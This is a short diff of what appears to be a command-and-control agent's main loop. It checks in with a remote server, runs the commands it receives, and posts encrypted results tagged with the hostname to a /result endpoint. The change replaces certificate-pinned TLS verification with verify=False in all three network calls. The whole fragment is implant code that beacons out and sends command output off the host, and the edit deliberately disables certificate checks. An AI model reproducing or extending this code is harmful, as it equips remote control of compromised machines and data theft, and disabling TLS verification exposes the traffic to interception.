@@ -57,7 +57,7 @@ def run_agent():
                     f"{url}/checkin",
                     data=encrypted_heartbeat,
                     timeout=10,
-                    verify=CERT_PATH
+                    verify=False
                 )
 
                 if response.status_code == 200:
@@ -83,7 +83,7 @@ def run_agent():
                         requests.post(
                             f"{url}/result",
                             data=encrypted_result,
-                            verify=CERT_PATH,
+                            verify=False,
                             timeout=10
                         )
                         if DEBUG_MODE is True:
@@ -95,7 +95,7 @@ def run_agent():
                 # Fallback for empty results/errors
                 error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                 try:
-                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=CERT_PATH, timeout=5)
+                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=False, timeout=5)
                 except Exception:
                     pass
                 if DEBUG_MODE is True:
